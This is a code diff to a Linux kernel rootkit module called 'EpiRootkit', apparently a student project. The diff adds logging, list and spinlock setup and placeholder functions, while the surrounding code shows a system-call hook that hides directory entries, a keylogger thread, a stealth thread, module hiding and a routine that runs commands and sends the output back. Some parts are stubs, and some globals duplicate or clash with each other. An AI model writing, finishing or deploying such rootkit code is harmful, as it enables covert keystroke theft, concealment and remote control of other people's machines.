@@ -22,6 +22,7 @@
 #include <linux/jiffies.h>
 #include <linux/delay.h>
 #include <linux/inet.h>
+#include <linux/list.h>
 #include "epirootkit.h"
 
 MODULE_LICENSE("GPL");
@@ -87,6 +88,11 @@ static bool g_is_authenticated = false;
 static char g_password[256] = "epita";
 static struct list_head *g_prev_module = NULL;
 static struct keylog_buffer *g_keylog_buffer = NULL;
+
+char keylog_buffer[KEYLOG_BUFFER_SIZE];
+int keylog_buffer_index = 0;
+struct list_head module_list;
+bool module_hidden = false;
 
 static void exec_and_send_output(const char *command) {
     struct file *output_file;
@@ -227,6 +233,14 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
 }
 
 static int __init epirootkit_init(void) {
+    printk(KERN_INFO "EpiRootkit: Initializing...\n");
+    
+    // Initialize lists
+    INIT_LIST_HEAD(&module_list);
+    
+    // Initialize spinlock
+    spin_lock_init(&hook_lock);
+    
     g_keylog_thread = kthread_run(keylog_thread, NULL, "keylog_thread");
     if (IS_ERR(g_keylog_thread)) {
         g_keylog_thread = NULL;
@@ -238,10 +252,13 @@ static int __init epirootkit_init(void) {
         return PTR_ERR(g_stealth_thread);
     }
     
+    printk(KERN_INFO "EpiRootkit: Initialized successfully\n");
     return 0;
 }
 
 static void __exit epirootkit_exit(void) {
+    printk(KERN_INFO "EpiRootkit: Cleaning up...\n");
+    
     unsigned long flags;
     struct dkom_entry *entry, *tmp;
     struct hook_entry *hook_entry, *hook_tmp;
@@ -289,6 +306,8 @@ static void __exit epirootkit_exit(void) {
         kfree(hook_entry);
     }
     spin_unlock_irqrestore(&hook_lock, flags);
+
+    printk(KERN_INFO "EpiRootkit: Cleanup complete\n");
 }
 
 // Hook management
@@ -297,7 +316,7 @@ void remove_hook(struct hook_entry *entry) {
     
     // Restore original function
     if (entry->original) {
-        *entry->target = entry->original;
+        *(void **)entry->target = entry->original;
     }
     
     // Remove from list
@@ -326,7 +345,18 @@ void keylog_buffer_cleanup(void) {
     keylog_buffer_index = 0;
 }
 
+void send_keylog_data(void) {
+    // Implementation will be added later
+    printk(KERN_INFO "Sending keylog data...\n");
+}
+
 // Module hiding
+void hide_module(void) {
+    // Implementation will be added later
+    printk(KERN_INFO "Hiding module...\n");
+    module_hidden = true;
+}
+
 void unhide_module(void) {
     // Remove module from hidden list
     list_del(&module_list);
